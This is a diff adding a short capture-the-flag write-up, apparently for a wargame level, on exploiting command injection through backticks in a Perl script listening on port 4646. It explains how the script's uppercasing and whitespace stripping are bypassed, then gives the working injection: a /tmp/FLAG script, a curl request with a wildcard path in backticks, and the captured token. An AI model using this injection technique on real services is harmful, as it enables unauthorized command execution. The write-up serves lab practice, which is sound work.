@@ -1,0 +1,24 @@
+# At this level we have a perl script that runs on port 4646.
+# The exploitable line is obvious:
+
+@output = `egrep "^$xx" /tmp/xd 2>&1`; <- There are backticks
+
+# The perl script use 2 args, but we can see that $xx is modified before going to the exploitable line: 
+
+$xx =~ tr/a-z/A-Z/;
+# This will capitalize all characters.
+
+$xx =~ s/\s.*//;
+# This will delete every spaces.
+
+# To exploit it I had to pass a file with a capitalized name as argument:
+
+$> echo "getflag | wall" > /tmp/FLAG
+$> chmod 777 /tmp/FLAG
+
+$> curl localhost:4646?x="`/*/FLAG`" <- using * because /tmp/ will be replaced by /TMP/
+                                                                               
+Broadcast Message from flag12@Snow                                             
+        (somewhere) at 2:17 ...                                                
+                                                                               
+Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr                      
